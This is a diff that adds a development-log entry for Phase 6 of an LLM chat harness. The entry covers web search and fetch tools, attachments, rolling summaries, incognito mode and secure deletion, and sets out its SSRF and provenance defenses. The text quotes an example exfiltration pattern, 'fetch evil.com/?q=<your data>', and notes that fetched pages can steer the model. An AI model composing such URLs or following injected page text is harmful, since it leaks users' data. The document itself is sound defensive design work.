@@ -684,3 +684,63 @@ chat works.
 
 **Next:** Phase 6, chat capability (web search tool, attachments, token meter, rolling
 summary, incognito TTL).
+
+### 2026-11-03 — Phase 6 (chat capability): done
+
+**Done**
+* **Web tools** (new crate `harness-web`), offered to chats when configured in `[web]`:
+  `web_search` (self-hosted SearXNG, or Brave with a key) and `web_fetch`. `web_fetch`
+  is the risky one, so: every hostname goes through a resolver that drops loopback,
+  private, link-local, CGNAT/tailnet, NAT64 and other non-public addresses (redirects
+  too; IP literals and `localhost` checked up front; env proxies ignored so they cannot
+  bypass it), and a URL is fetched only if it appears in text from the user or a tool,
+  never one the model composed (closes "fetch evil.com/?q=<your data>"). Pages become
+  text (html2text), capped at 2 MB read / 20k characters.
+* **Attachments**: `+` in the bar uploads text, code, Markdown, CSV, JSON or PDF (text
+  layer). Text is extracted on the master (PDF parsing in a blocking task, so a parser
+  panic is an error, not a crash), capped at 100k characters, and travels *inside* the
+  `user_message` event so the log alone rebuilds what the model saw. Uploads are owned,
+  single-use, and expire unsent after the incognito TTL.
+* **Token meter**: `turn_ended.usage` gains `context_tokens` (input of the turn's last
+  model call); the conversation header shows total tokens and current context size.
+* **Rolling summary**: once the history (since the last summary) is estimated above
+  `[chat] summarize_after_tokens` (default 24k), everything before the last two turns is
+  summarised by the same model into a `history_summarized` event; later turns send
+  system prompt + summary + recent turns. Skipped when the old part is small (otherwise
+  two huge turns would trigger a summary call on every turn). The UI shows the latest
+  summary as a collapsible marker.
+* **Incognito** (chat only): toggle in the bar; banner in the chat; hidden from recents,
+  search and suggestions; deleted by the chat runtime *and* the master after
+  `[chat] incognito_ttl_minutes` idle (default 24 h), or at once with "Delete now".
+* **Deleting chats**: `DELETE /api/sessions/{id}` (trash icon). Deletes overwrite
+  (`secure_delete`), merge the FTS index (`optimize`) and truncate the WAL; the mirror
+  keeps a tombstone so a node that was offline cannot replay the chat back.
+* **Context line**: each prompt carries the user's name, local date/time in their saved
+  zone and optional city/country. Time zones are now validated against a bundled tz
+  database (`jiff`); the Phase 5 check was only a character filter.
+
+**Evidence**
+* Rust 123. Gate test `incognito_leaves_no_rows_after_ttl`: after the TTL the chat is
+  gone from both databases and a marker string is not found anywhere in the db/WAL
+  files (the same check first proves it *does* find live text). Also: SSRF table
+  (14 address classes), provenance, redirect-inward refused, attachment ownership and
+  single use, summary reuse.
+* `web/e2e/phase6.cjs` on the real binary with a fake SearXNG: search tool, refused local
+  fetch, attachment text reaching the model, meter + summary, incognito hidden /
+  unsearchable / deleted. Phases 3–5 e2e still green. Initial JS 79.1 KB gzip.
+  Idle RSS (release) 17 MB.
+* Found and fixed: debug info for ~30 test binaries filled the disk (18 GB); dev profile
+  now keeps line tables only (1.6 GB).
+
+**Risks**
+* `web_fetch` provenance is lexical: a URL the user pasted can still carry data the user
+  typed. Pages are untrusted text and can still steer the model inside the chat.
+* No web search out of the box: SearXNG must be run (a "service = URL") or a Brave key
+  given. Web settings need a restart (no UI yet).
+* Summaries are written by the chat model itself and can drop details; the full log is
+  kept and the summary is visible, but the model only sees the summary.
+* Token estimates (4 chars/token) decide when to summarise; real counts differ by model.
+* PDF parsing of hostile files runs in-process (blocking thread, size-capped); a
+  subprocess sandbox would be stronger.
+
+**Next:** Phase 7, memory.
